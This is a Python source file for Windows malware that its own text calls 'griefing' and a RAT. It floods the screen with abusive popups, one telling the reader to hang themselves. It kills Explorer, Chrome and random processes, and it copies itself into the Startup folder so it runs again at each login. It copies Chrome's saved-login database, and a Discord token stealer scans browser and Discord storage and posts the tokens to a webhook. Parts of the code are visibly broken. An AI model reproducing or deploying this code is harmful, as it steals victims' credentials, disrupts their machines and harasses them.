import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse, re, json
from urllib.request import Request, urlopen

class harmless:
    """Harmless modules"""
    def pop_up(self):
        """Spams popups"""
        while 1:
            pop_up_text = ["LOL UR SO DUMB",
                    "FUCKING IDIOT",
                    "JUST RATTED YOU",
                    "DUMBASS"]
            ctypes.windll.user32.MessageBoxW(0, random.choice(pop_up_text), "LOL", random.randint(1, 5))
            time.sleep(random.randint(1, 5))
            
    def open_url(self):
        """Opens urls from list randomly"""
        while 1:
            links = ["google.com",
                "youtube.com"]
            webbrowser.open_new_tab(random.choice(links))
            time.sleep(random.randint(1, 10))
            
    def change_wallpaper(self):
        """Changes the wallpaper with random images from screenshot folder"""
        while 1:
            try:
                pic = random.choice(os.listdir(f"{os.path.expanduser('~')}\Pictures\Screenshots"))
                path = f"{os.path.expanduser('~')}\Pictures\Screenshots\{pic}"
                
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
                time.sleep(random.randint(0, 3))
            except:
                pass
    
    def mouse_lock(self):
        while 1:
            mouse.drag(0, 0, 0, 0, absolute=True, duration=0)
        
        
            
class malware:
    def kill(self):
        """Kills select tasks"""
        while 1:
            kill_list = ["explorer.exe",
                         "wallpaper64.exe",
                         "wallpaper32.exe",
                         "chrome.exe"]
            for program in kill_list:
                os.system(f"taskkill /f /im {program}")
            time.sleep(30)
            
    def random_kill(self):
        """KILLS RANDOM PROCESSES"""
        while 1:
            processes = []
            for proc in psutil.process_iter():
                try:
                    processName = proc.name()
                    processes.append(processName)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
                
                program = random.choice(processes)
                if program != "svchost.exe":
                    os.system(f"taskkill /f /im {program}")
                time.sleep(random.randint(5, 15))
                
            def isAdmin():
                """CHECK IS RAN AS ADMIN"""
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            
            if isAdmin():
                if random.randint(0, 100) == 1:
                    os.system(f"taskkill /f /im svchost.exe")
                
                
            time.sleep(random.randint(1, 20))
        
    def create_random_folder(self):
        """Creates random files with a base64 name"""
        while 1:
            for i in range(random.randint(1, 80)):
                try:
                    file_names = ["LOL UR RETARDED",
                                "LOL I RATTED YOU",
                                "UR SO GAY",
                                "YOU KNOW DN?",
                                "UR SO DUMB LOOOOL",
                                "HANG URSELF",
                                "Why did you run this?, lol.",
                                "Add NotSqvage#6666 on discord and tell him hes gay",
                                "If you see this you have to send money"]
                    
                    byte_stream = random.choice(file_names).encode("ascii")
            
                    base64_bytes = base64.b64encode(byte_stream)
                    base64_string = base64_bytes.decode("ascii")
                    
                    path = f"{os.path.expanduser('~')}\Desktop\{''.join(base64_string)}"
                    os.mkdir(path)
                except:
                    pass
            time.sleep(random.randint(1, 25))
    
        
class harmful:
    
    
    def dump(self):
        """Dumps databases and thing prepared for sending"""
        # WORK ON LATER 
        print(os.path.isdir("C:\Program Files\Google\Chrome\Application"))
        print(os.path.isdir(os.path.expanduser('~') + "\AppData\Local\Discord"))
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db")


if __name__ == "__main__":
    ctypes.windll.user32.MessageBoxW(0, "YOUR PC HAS BEEN GRIEFED BY A PC FUCKER", "LOL UR SO DUMB", 1)
    
    for i in range(random.randint(25, 200)):
        open(f"{''.join(random.choice(string.ascii_letters) for i in range(random.randint(20, 250)))}.txt", "a").write("LOL WHY DID U RUN THIS????")
    
    #FIX LATER THIS SO ANNOYING!!!!!!
    try:
        startup = os.environ["USERPROFILE"] + os.sep + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        shutil.copy2(__file__, startup)
    except:
        pass
    
    
    
    # your webhook URL
    WEBHOOK_URL = 'WEBHOOK HERE'

    # mentions you when you get a hit
    PING_ME = False

    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens

    def main():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': f"{roaming}\\Discord",
            'Discord Canary': f"{roaming}\\discordcanary",
            'Discord PTB': f"{roaming}\\discordptb",
            'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
            'Opera': f"{roaming}\\Opera Software\\Opera Stable",
            'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default"
        }

        message = '@everyone' if PING_ME else ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'

            message += '```'

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        payload = json.dumps({'content': message})

        try:
            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
            urlopen(req)
        except:
            pass
        
        main()
    
    
    harmless = harmless()
    malware = malware()
    
    #Threads
    popup_thread = threading.Thread(target=harmless.pop_up).start()
    openurl_thread = threading.Thread(target=harmless.open_url).start()
    change_wallpaper = threading.Thread(target=harmless.change_wallpaper).start()
    mouse_locker = threading.Thread(target=harmless.mouse_lock).start()
    kill_thread = threading.Thread(target=malware.kill).start()
    random_kill_thread = threading.Thread(target=malware.random_kill).start()
    create_random_folder_thread = threading.Thread(target=malware.create_random_folder).start()
    #rat_thread = threading.Thread(target=harmful.rat).start()
    
    #Make rat multiprocessed
    
    popup_thread.join()
    openurl_thread.join()
    change_wallpaper.join()
    kill_thread.join()
    mouse_locker.join()
    random_kill_thread.join()
    create_random_folder_thread.join()
    #rat_thread.join()
    
    
    
    
